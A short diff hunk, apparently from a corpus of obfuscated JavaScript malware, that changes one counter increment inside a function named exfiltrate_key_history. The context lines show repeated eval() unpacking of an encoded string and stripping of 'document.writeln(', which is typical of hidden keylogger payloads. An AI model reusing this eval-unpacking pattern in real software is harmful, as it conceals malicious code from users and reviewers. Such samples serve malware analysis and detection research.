@@ -14,7 +14,7 @@ function exfiltrate_key_history() {
   var v1 = z$$2 < 2;
   for (;v1;) {
     x$$47 = eval(x$$47);
-    z$$2 = z$$2 + 1;
+    z$$2++;
     v1 = z$$2 < 2;
   }
   x$$47 = x$$47.replace("document.writeln(", "");
